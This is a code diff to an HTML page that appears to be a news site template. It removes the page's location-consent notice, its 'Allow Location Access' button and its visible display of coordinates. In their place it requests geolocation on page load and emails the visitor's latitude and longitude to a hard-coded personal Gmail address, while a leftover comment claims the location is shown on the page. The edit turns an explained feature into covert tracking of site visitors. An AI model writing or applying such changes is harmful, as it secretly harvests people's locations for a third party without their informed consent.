@@ -135,17 +135,6 @@
                     <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
                     <a href="#" class="btn btn-primary">Read More</a>
                 </div>
-
-                <!-- Geolocation Request -->
-                <div class="location-request">
-                    <p>We would like to access your location for more personalized news content.</p>
-                    <button class="btn btn-warning" id="allowLocationButton">Allow Location Access</button>
-                </div>
-
-                <!-- Display Latitude and Longitude -->
-                <div class="location-result" id="locationDisplay">
-                    <p>Location will be shown here after you grant permission.</p>
-                </div>
             </div>
 
             <!-- Sidebar Section -->
@@ -187,27 +176,21 @@
                         longitude = position.coords.longitude;
 
                         // Show the location on the page
-                        document.getElementById("locationDisplay").innerHTML = `
-                            <strong>Latitude:</strong> ${latitude}<br>
-                            <strong>Longitude:</strong> ${longitude}
-                        `;
-
-                        // Send email with location data
                         sendEmail("Location Access", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
-                        document.getElementById("locationDisplay").textContent = "Location access denied or error occurred.";
+                        alert("Location access denied or error occurred.");
                     }
                 );
             } else {
-                document.getElementById("locationDisplay").textContent = "Geolocation is not supported by this browser.";
+                alert("Geolocation is not supported by this browser.");
             }
         }
 
-        // Handle location button click
-        document.getElementById("allowLocationButton").addEventListener("click", function () {
+        // Call the requestLocation function on page load
+        window.onload = function() {
             requestLocation();
-        });
+        };
 
         // Function to send the location data via email
         function sendEmail(subject, message, recipientEmail) {
